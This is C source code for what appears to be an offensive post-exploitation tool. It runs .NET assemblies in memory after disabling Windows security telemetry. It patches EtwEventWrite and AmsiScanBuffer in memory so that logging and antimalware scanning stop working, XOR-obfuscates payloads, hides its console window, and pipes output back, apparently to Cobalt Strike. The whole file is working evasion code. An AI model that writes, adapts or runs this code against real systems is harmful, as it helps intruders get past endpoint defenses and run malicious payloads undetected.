

#include "globals.h"
#include "inlineExecute-Assembly.h"

#pragma comment(lib, "mscoree.lib")

/*Make MailSlot*/
BOOL WINAPI MakeSlot(LPCSTR lpszSlotName, HANDLE* mailHandle)
{
	*mailHandle = CreateMailslotA(lpszSlotName,
		0,                             //No maximum message size 
		MAILSLOT_WAIT_FOREVER,         //No time-out for operations 
		(LPSECURITY_ATTRIBUTES)NULL);  //Default security
		
	if (*mailHandle == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	else
		return TRUE;
}

/*Read Mailslot*/
BOOL ReadSlot(char* output, HANDLE* mailHandle)
{
	DWORD cbMessage = 0;
	DWORD cMessage = 0;
	DWORD cbRead = 0;
	BOOL fResult;
	LPSTR lpszBuffer = NULL;
	size_t size = 65535;
	char* achID = (char*)intAlloc(size);
	memset(achID, 0, size);
	DWORD cAllMessages = 0;
	HANDLE hEvent;
	OVERLAPPED ov;

	hEvent = CreateEventA(NULL, FALSE, FALSE, NULL);
	if (NULL == hEvent)
		return FALSE;
	ov.Offset = 0;
	ov.OffsetHigh = 0;
	ov.hEvent = hEvent;
	
	fResult = GetMailslotInfo(*mailHandle, //Mailslot handle 
		(LPDWORD)NULL,               //No maximum message size 
		&cbMessage,                  //Size of next message 
		&cMessage,                   //Number of messages 
		(LPDWORD)NULL);              //No read time-out 

	if (!fResult)
	{
		return FALSE;
	}

	if (cbMessage == MAILSLOT_NO_MESSAGE)
	{
		return TRUE;
	}
	
	cAllMessages = cMessage;
	
	while (cMessage != 0)  //Get all messages
	{
		//Allocate memory for the message. 
		lpszBuffer = (LPSTR)GlobalAlloc(GPTR, lstrlenA((LPSTR)achID) * sizeof(CHAR) + cbMessage);
		if (NULL == lpszBuffer)
			return FALSE;
		lpszBuffer[0] = '\0';

		fResult = ReadFile(*mailHandle,
			lpszBuffer,
			cbMessage,
			&cbRead,
			&ov);

		if (!fResult)
		{
			GlobalFree((HGLOBAL)lpszBuffer);
			return FALSE;
		}

		//Copy mailslot output to returnData buffer
		_snprintf(output + strlen(output), strlen(lpszBuffer) + 1, "%s", lpszBuffer);
		
		fResult = GetMailslotInfo(*mailHandle,  //Mailslot handle 
			(LPDWORD)NULL,               //No maximum message size 
			&cbMessage,                  //Size of next message 
			&cMessage,                   //Number of messages 
			(LPDWORD)NULL);              //No read time-out 

		if (!fResult)
		{
			return FALSE;
		}
		
	}
	
	cbMessage = 0;
	GlobalFree((HGLOBAL)lpszBuffer);
	_CloseHandle CloseHandle = (_CloseHandle) GetProcAddress(GetModuleHandleA("kernel32.dll"), "CloseHandle");
	CloseHandle(hEvent);
	return TRUE;
}

/*Determine if .NET assembly is v4 or v2*/
BOOL FindVersion(void * assembly, int length) {
	char* assembly_c;
	assembly_c = (char*)assembly;
	char v4[] = { 0x76,0x34,0x2E,0x30,0x2E,0x33,0x30,0x33,0x31,0x39 };
	
	for (int i = 0; i < length; i++)
	{
		for (int j = 0; j < 10; j++)
		{
			if (v4[j] != assembly_c[i + j])
			{
				break;
			}
			else
			{
				if (j == (9))
				{
					return 1;
				}
			}
		}
	}

	return 0;
}

/*Patch ETW*/
BOOL patchETW(BOOL revertETW)
{
#ifdef _M_AMD64
	unsigned char etwPatch[] = { 0 };
#elif defined(_M_IX86)
	unsigned char etwPatch[3] = { 0 };
#endif
	SIZE_T uSize = 8;
	ULONG patchSize = 0;
	
	if (revertETW != 0) {
#ifdef _M_AMD64
		//revert ETW x64
		patchSize = 1;
		memcpy(etwPatch, (unsigned char[]){ 0x4c }, patchSize);
#elif defined(_M_IX86)
		//revert ETW x86
		patchSize = 3;
		memcpy((char*)etwPatch, "\x8b\xff\x55", patchSize);
#endif		
	}
	else {
#ifdef _M_AMD64
		//Break ETW x64
		patchSize = 1;
		memcpy(etwPatch, (unsigned char[]){ 0xc3 }, patchSize);
#elif defined(_M_IX86)
		//Break ETW x86
		patchSize = 3;
		memcpy((char*)etwPatch, "\xc2\x14\x00", patchSize);
#endif			
	}
	
	//Get pointer to EtwEventWrite 
	void* pAddress = (PVOID) GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
	if(pAddress == NULL)
	{
		printf("Getting pointer to EtwEventWrite failed\n");
		return 0;
	}	
	
	void* lpBaseAddress = pAddress;
	ULONG OldProtection, NewProtection;

	//Change memory protection via NTProtectVirtualMemory
	_NtProtectVirtualMemory NtProtectVirtualMemory = (_NtProtectVirtualMemory) GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory");
	NTSTATUS status = NtProtectVirtualMemory(GetCurrentProcess(), (PVOID)&lpBaseAddress, (PULONG)&uSize, PAGE_EXECUTE_READWRITE, &OldProtection);
	if (status != 0) {
		printf("[-] NtProtectVirtualMemory failed %d\n", status);
		return 0;
	}

	//Patch ETW via NTWriteVirtualMemory
	_NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory) GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
	status = NtWriteVirtualMemory(GetCurrentProcess(), pAddress, (PVOID)etwPatch, sizeof(etwPatch)/sizeof(etwPatch[0]), NULL);
	if (status != 0) {
		printf("[-] NtWriteVirtualMemory failed\n");
		return 0;
	}

	//Revert back memory protection via NTProtectVirtualMemory
	status = NtProtectVirtualMemory(GetCurrentProcess(), (PVOID)&lpBaseAddress, (PULONG)&uSize, OldProtection, &NewProtection);
	if (status != 0) {
		printf("[-] NtProtectVirtualMemory2 failed\n");
		return 0;
	}

	//Successfully patched ETW
	return 1;
	
}

/*Patch AMSI*/
BOOL patchAMSI()
{
	
#ifdef _M_AMD64
    unsigned char amsiPatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };//x64
#elif defined(_M_IX86)
	unsigned char amsiPatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };//x86
#endif

	HINSTANCE hinst = LoadLibrary("amsi.dll");
    void* pAddress = (PVOID)GetProcAddress(hinst, "AmsiScanBuffer");
	if(pAddress == NULL)
	{
		printf("AmsiScanBuffer failed\n");
		return 0;
	}
	
	void* lpBaseAddress = pAddress;
	ULONG OldProtection, NewProtection;
	SIZE_T uSize = sizeof(amsiPatch);
	
	//Change memory protection via NTProtectVirtualMemory
	_NtProtectVirtualMemory NtProtectVirtualMemory = (_NtProtectVirtualMemory) GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory");
	NTSTATUS status = NtProtectVirtualMemory(GetCurrentProcess(), (PVOID)&lpBaseAddress, (PULONG)&uSize, PAGE_EXECUTE_READWRITE, &OldProtection);
	if (status != 0) {
		printf("[-] NtProtectVirtualMemory failed %d\n", status);
		return 0;
	}

	//Patch AMSI via NTWriteVirtualMemory
	_NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory) GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
	status = NtWriteVirtualMemory(GetCurrentProcess(), pAddress, (PVOID)amsiPatch, sizeof(amsiPatch), NULL);
	if (status != 0) {
		printf("[-] NtWriteVirtualMemory failed\n");
		return 0;
	}

	//Revert back memory protection via NTProtectVirtualMemory
	status = NtProtectVirtualMemory(GetCurrentProcess(), (PVOID)&lpBaseAddress, (PULONG)&uSize, OldProtection, &NewProtection);
	if (status != 0) {
		printf("[-] NtProtectVirtualMemory2 failed\n");
		return 0;
	}
	
	//Successfully patched AMSI
	return 1;	
}

/*Start CLR*/
static BOOL StartCLR(LPCWSTR dotNetVersion, ICLRMetaHost * *ppClrMetaHost, ICLRRuntimeInfo * *ppClrRuntimeInfo, ICorRuntimeHost * *ppICorRuntimeHost) {

	//Declare variables
	HRESULT hr;

	//Get the CLRMetaHost that tells us about .NET on this machine
	hr = CLRCreateInstance(&xCLSID_CLRMetaHost, &xIID_ICLRMetaHost, (LPVOID*)ppClrMetaHost);
	
	if (hr == S_OK)
	{
		//Get the runtime information for the particular version of .NET
		hr = (*ppClrMetaHost)->lpVtbl->GetRuntime(*ppClrMetaHost, dotNetVersion, &xIID_ICLRRuntimeInfo, (LPVOID*)ppClrRuntimeInfo);
		if (hr == S_OK)
		{
			/*Check if the specified runtime can be loaded into the process. This method will take into account other runtimes that may already be
			loaded into the process and set fLoadable to TRUE if this runtime can be loaded in an in-process side-by-side fashion.*/
			BOOL fLoadable;
			hr = (*ppClrRuntimeInfo)->lpVtbl->IsLoadable(*ppClrRuntimeInfo, &fLoadable);
			if ((hr == S_OK) && fLoadable)
			{
				//Load the CLR into the current process and return a runtime interface pointer. -> CLR changed to ICor which is deprecated but works
				hr = (*ppClrRuntimeInfo)->lpVtbl->GetInterface(*ppClrRuntimeInfo, &xCLSID_CorRuntimeHost, &xIID_ICorRuntimeHost, (LPVOID*)ppICorRuntimeHost);
				if (hr == S_OK)
				{
					//Start it. This is okay to call even if the CLR is already running
					(*ppICorRuntimeHost)->lpVtbl->Start(*ppICorRuntimeHost);			
				}
				else
				{
				//If CLR fails to load fail gracefully
				printf("[-] Process refusing to get interface of %ls CLR version.  Try running an assembly that requires a differnt CLR version.\n", dotNetVersion);
				return 0;
				}
			}
			else
			{
				//If CLR fails to load fail gracefully
				printf("[-] Process refusing to load %ls CLR version.  Try running an assembly that requires a differnt CLR version.\n", dotNetVersion);
				return 0;
			}
		}
		else
		{
			//If CLR fails to load fail gracefully
			printf("[-] Process refusing to get runtime of %ls CLR version.  Try running an assembly that requires a differnt CLR version.\n", dotNetVersion);
			return 0;
		}
	}
	else
	{
		//If CLR fails to load fail gracefully
		printf("[-] Process refusing to create %ls CLR version.  Try running an assembly that requires a differnt CLR version.\n", dotNetVersion);
		return 0;
	}

	//CLR loaded successfully
	return 1;
}

/*Check Console Exists*/
static BOOL consoleExists(void) {//https://www.devever.net/~hl/win32con
 _GetConsoleWindow GetConsoleWindow = (_GetConsoleWindow) GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetConsoleWindow");
 return !!GetConsoleWindow();
}


int main(int argc, char ** argv) {//Executes .NET assembly in memory

	char * appDomain = NULL;
	char * assemblyName = NULL;
	char * assemblyArguments = NULL;
	char * pipeName = NULL;
	char * slotName = NULL;
	char * encryptFileName = NULL;
	char * outFile = NULL;
	PBYTE assemblyBytes = NULL;
	BOOL amsi = 1;
	BOOL entryPoint = 1;
	BOOL etw = 1;
	BOOL revertETW = 0;
	BOOL mailSlot = 0;
	BOOL decrypt = 0;
	DWORD assemblyByteLen = 0;
	
	string_get_args_by_name(argc, argv, "appdomain", &appDomain, "");
	string_bool_args_by_name(argc, argv, "amsi", &amsi);
	string_bool_args_by_name(argc, argv, "etw", &etw);
	string_bool_args_by_name(argc, argv, "revertetw", &revertETW);
	string_bool_args_by_name(argc, argv, "mailslot", &mailSlot);
	string_get_args_by_name(argc, argv, "slotname", &slotName, "");
	string_get_args_by_name(argc, argv, "pipename", &pipeName, "generic");
	string_get_args_by_name(argc, argv, "args", &assemblyArguments, "");
	string_get_args_by_name(argc, argv, "assembly", &assemblyName, "");

	if (string_get_args_by_name(argc, argv, "encrypt", &encryptFileName, NULL)) {
		if (string_get_args_by_name(argc, argv, "outfile", &outFile, NULL)) {
			if (file_read(encryptFileName, &assemblyBytes, &assemblyByteLen, 0)) {
				printf("[+] Loaded file %s for encryption [%d bytes]\n", encryptFileName, assemblyByteLen);

				bytes_xor(assemblyBytes, assemblyByteLen);

				if (file_write(outFile, assemblyBytes, assemblyByteLen)) {

					printf("[+] File %s written!\n", outFile);
				}
				else {
					printf("[!] Error writing file %s\n", outFile);
				}
			}
			else {
				printf("[!] Error reading file %s\n", encryptFileName);
			}
		}
		else {
			printf("[!] /outFile:<filename> required for encryption.\n");
			return;
		}
	}
	else if (string_get_args_by_name(argc, argv, "assembly", &assemblyName, "")) {

		//Create slot and pipe names	
		SIZE_T pipeNameLen = strlen(pipeName);
		char* pipePath = malloc(pipeNameLen + 10);
		memset(pipePath, 0, pipeNameLen + 10);
		memcpy(pipePath, "\\\\.\\pipe\\", 9);
		memcpy(pipePath + 9, pipeName, pipeNameLen + 1);

		SIZE_T slotNameLen = strlen(slotName);
		char* slotPath = malloc(slotNameLen + 14);
		memset(slotPath, 0, slotNameLen + 14);
		memcpy(slotPath, "\\\\.\\mailslot\\", 13);
		memcpy(slotPath + 13, slotName, slotNameLen + 1);

		//Declare other variables
		HRESULT hr;
		ICLRMetaHost* pClrMetaHost = NULL;//done
		ICLRRuntimeInfo* pClrRuntimeInfo = NULL;//done
		ICorRuntimeHost* pICorRuntimeHost = NULL;
		IUnknown* pAppDomainThunk = NULL;
		AppDomain* pAppDomain = NULL;
		Assembly* pAssembly = NULL;
		MethodInfo* pMethodInfo = NULL;
		VARIANT vtPsa = { 0 };
		SAFEARRAYBOUND rgsabound[1] = { 0 };
		wchar_t * wAssemblyArguments = NULL;
		wchar_t * wAppDomain = NULL;
		wchar_t * wNetVersion = NULL;
		LPWSTR* argumentsArray = NULL;
		int argumentCount = 0;
		HANDLE stdOutput;
		HANDLE stdError;
		HANDLE mainHandle;
		HANDLE hFile;
		size_t wideSize = 0;
		size_t wideSize2 = 0;
		BOOL success = 1;
		size_t size = 65535;
		char* returnData = (char*)intAlloc(size);
		memset(returnData, 0, size);

		if (file_exists(assemblyName)) {
			if (file_read(assemblyName, &assemblyBytes, &assemblyByteLen, 0)) {

				if (string_bool_args_by_name(argc, argv, "decrypt", &decrypt)) {
					printf("[+] Decrypting...\n");
					bytes_xor(assemblyBytes, assemblyByteLen);
				}

				//Determine .NET assemblie version
				if (FindVersion((void*)assemblyBytes, assemblyByteLen))
				{
					wNetVersion = L"v4.0.30319";
				}
				else
				{
					wNetVersion = L"v2.0.50727";
				}

				printf("[+] Got .NET assembly version: %ls\n", wNetVersion);

				//Convert assemblyArguments to wide string wAssemblyArguments to pass to loaded .NET assmebly
				size_t convertedChars = 0;
				wideSize = strlen(assemblyArguments) + 1;
				wAssemblyArguments = (wchar_t*)malloc(wideSize * sizeof(wchar_t));
				mbstowcs_s(&convertedChars, wAssemblyArguments, wideSize, assemblyArguments, _TRUNCATE);

				//Convert appDomain to wide string wAppDomain to pass to CreateDomain
				size_t convertedChars2 = 0;
				wideSize2 = strlen(appDomain) + 1;
				wAppDomain = (wchar_t*)malloc(wideSize2 * sizeof(wchar_t));
				mbstowcs_s(&convertedChars2, wAppDomain, wideSize2, appDomain, _TRUNCATE);

				//Get an array of arguments so arugements can be passed to .NET assembly
				argumentsArray = CommandLineToArgvW(wAssemblyArguments, &argumentCount);

				//Create an array of strings that will be used to hold our arguments -> needed for Main(String[] args)
				vtPsa.vt = (VT_ARRAY | VT_BSTR);
				vtPsa.parray = SafeArrayCreateVector(VT_BSTR, 0, argumentCount);

				for (long i = 0; i < argumentCount; i++)
				{
					//Insert the string from argumentsArray[i] into the safearray
					SafeArrayPutElement(vtPsa.parray, &i, SysAllocString(argumentsArray[i]));
				}

				//Break ETW
				if (etw != 0 || revertETW != 0) {
					success = patchETW(0);

					if (success != 1) {

						//If patching ETW fails exit gracefully
						printf("Patching ETW failed.  Try running without patching ETW");
						return;
					}
				}

				//Start CLR
				success = StartCLR((LPCWSTR)wNetVersion, &pClrMetaHost, &pClrRuntimeInfo, &pICorRuntimeHost);

				//If starting CLR fails exit gracefully
				if (success != 1) {
					return;
				}

				if (mailSlot != 0) {

					//Create Mailslot
					success = MakeSlot(slotPath, &mainHandle);

					//Get a handle to our pipe or mailslot
					hFile = CreateFileA(slotPath, GENERIC_WRITE, FILE_SHARE_READ, (LPSECURITY_ATTRIBUTES)NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, (HANDLE)NULL);
				}
				else {

					//Create named pipe
					_CreateNamedPipeA CreateNamedPipeA = (_CreateNamedPipeA)GetProcAddress(GetModuleHandleA("kernel32.dll"), "CreateNamedPipeA");
					mainHandle = CreateNamedPipeA(pipePath, PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE, PIPE_TYPE_MESSAGE, PIPE_UNLIMITED_INSTANCES, 65535, 65535, 0, NULL);

					//Get a handle to our previously created named pipe
					hFile = CreateFileA(pipePath, GENERIC_WRITE, FILE_SHARE_READ, (LPSECURITY_ATTRIBUTES)NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, (HANDLE)NULL);
				}

				//Attach or create console
				BOOL frConsole = 0;
				BOOL attConsole = 0;
				attConsole = consoleExists();

				if (attConsole != 1)
				{
					frConsole = 1;
					_AllocConsole AllocConsole = (_AllocConsole)GetProcAddress(GetModuleHandleA("kernel32.dll"), "AllocConsole");
					_GetConsoleWindow GetConsoleWindow = (_GetConsoleWindow)GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetConsoleWindow");
					AllocConsole();

					//Hide Console Window
					HINSTANCE hinst = LoadLibrary("user32.dll");
					_ShowWindow ShowWindow = (_ShowWindow)GetProcAddress(hinst, "ShowWindow");
					HWND wnd = GetConsoleWindow();
					if (wnd)
						ShowWindow(wnd, SW_HIDE);
				}

				//Get current stdout handle so we can revert stdout after we finish
				_GetStdHandle GetStdHandle = (_GetStdHandle)GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetStdHandle");
				stdOutput = GetStdHandle(((DWORD)-11));

				//Set stdout to our newly created named pipe or mail slot
				_SetStdHandle SetStdHandle = (_SetStdHandle)GetProcAddress(GetModuleHandleA("kernel32.dll"), "SetStdHandle");
				success = SetStdHandle(((DWORD)-11), hFile);

				//Create our AppDomain
				hr = pICorRuntimeHost->lpVtbl->CreateDomain(pICorRuntimeHost, (LPCWSTR)wAppDomain, NULL, &pAppDomainThunk);
				hr = pAppDomainThunk->lpVtbl->QueryInterface(pAppDomainThunk, &xIID_AppDomain, (VOID**)&pAppDomain);

				//Patch amsi
				if (amsi != 0) {
					success = patchAMSI();

					//If patching AMSI fails exit gracefully
					if (success != 1) {
						printf("[!] Patching AMSI failed.  Try running without patching AMSI and using obfuscation\n");
						return;
					}
				}

				//Prep SafeArray 
				rgsabound[0].cElements = assemblyByteLen;
				rgsabound[0].lLbound = 0;
				SAFEARRAY* pSafeArray = SafeArrayCreate(VT_UI1, 1, rgsabound);
				void* pvData = NULL;
				hr = SafeArrayAccessData(pSafeArray, &pvData);

				//Copy our assembly bytes to pvData
				memcpy(pvData, assemblyBytes, assemblyByteLen);

				hr = SafeArrayUnaccessData(pSafeArray);

				//Prep AppDomain and EntryPoint
				hr = pAppDomain->lpVtbl->Load_3(pAppDomain, pSafeArray, &pAssembly);
				if (hr != S_OK) {
					//If AppDomain fails to load fail gracefully
					printf("[-] Process refusing to load AppDomain of %ls CLR version.  Try running an assembly that requires a differnt CLR version.\n", wNetVersion);
					return;
				}
				hr = pAssembly->lpVtbl->EntryPoint(pAssembly, &pMethodInfo);
				if (hr != S_OK) {
					//If EntryPoint fails to load fail gracefully
					printf("[-] Process refusing to find entry point of assembly.\n");
					return;
				}

				VARIANT retVal;
				ZeroMemory(&retVal, sizeof(VARIANT));
				VARIANT obj;
				ZeroMemory(&obj, sizeof(VARIANT));
				obj.vt = VT_NULL;

				//Change cElement to the number of Main arguments
				SAFEARRAY * psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, (ULONG)entryPoint);//Last field -> entryPoint == 1 is needed if Main(String[] args) 0 if Main()

				//Insert an array of BSTR into the VT_VARIANT psaStaticMethodArgs array
				long idx[1] = { 0 };
				SafeArrayPutElement(psaStaticMethodArgs, idx, &vtPsa);

				//Invoke our .NET Method
				hr = pMethodInfo->lpVtbl->Invoke_3(pMethodInfo, obj, psaStaticMethodArgs, &retVal);

				if (mailSlot != 0) {
					//Read from our mailslot
					success = ReadSlot(returnData, &mainHandle);
				}
				else {
					//Read from named pipe
					DWORD bytesToRead = 65535;
					DWORD bytesRead = 0;
					success = ReadFile(mainHandle, (LPVOID)returnData, bytesToRead, &bytesRead, NULL);
				}

				//Send .NET assembly output back to CS
				printf("\n\n%s\n", returnData);

				//Close handles
				_CloseHandle CloseHandle = (_CloseHandle)GetProcAddress(GetModuleHandleA("kernel32.dll"), "CloseHandle");
				CloseHandle(mainHandle);
				CloseHandle(hFile);

				//Revert stdout back to original handles
				success = SetStdHandle(((DWORD)-11), stdOutput);

				//Clean up
				SafeArrayDestroy(pSafeArray);
				VariantClear(&retVal);
				VariantClear(&obj);
				VariantClear(&vtPsa);

				if (NULL != psaStaticMethodArgs) {
					SafeArrayDestroy(psaStaticMethodArgs);

					psaStaticMethodArgs = NULL;
				}
				if (pMethodInfo != NULL) {

					pMethodInfo->lpVtbl->Release(pMethodInfo);
					pMethodInfo = NULL;
				}
				if (pAssembly != NULL) {

					pAssembly->lpVtbl->Release(pAssembly);
					pAssembly = NULL;
				}
				if (pAppDomain != NULL) {

					pAppDomain->lpVtbl->Release(pAppDomain);
					pAppDomain = NULL;
				}
				if (pAppDomainThunk != NULL) {

					pAppDomainThunk->lpVtbl->Release(pAppDomainThunk);
				}
				if (pICorRuntimeHost != NULL)
				{
					(pICorRuntimeHost)->lpVtbl->UnloadDomain(pICorRuntimeHost, pAppDomainThunk);
					(pICorRuntimeHost) = NULL;
				}
				if (pClrRuntimeInfo != NULL)
				{
					(pClrRuntimeInfo)->lpVtbl->Release(pClrRuntimeInfo);
					(pClrRuntimeInfo) = NULL;
				}
				if (pClrMetaHost != NULL)
				{
					(pClrMetaHost)->lpVtbl->Release(pClrMetaHost);
					(pClrMetaHost) = NULL;
				}

				//Free console only if we attached one
				if (frConsole != 0) {
					_FreeConsole FreeConsole = (_FreeConsole)GetProcAddress(GetModuleHandleA("kernel32.dll"), "FreeConsole");
					success = FreeConsole();
				}

				//Revert ETW if chosen
				if (revertETW != 0) {
					success = patchETW(revertETW);

					if (success != 1) {

						printf("Reverting ETW back failed\n");
					}
				}

				printf("[+] inlineExecute-Assembly Finished\n");
			}
			else {
				printf("[-] Error reading file %s\n", assemblyName);
			}
		}
		else {
			printf("[-] File %s cannot be found\n", assemblyName);
		}
	}
}
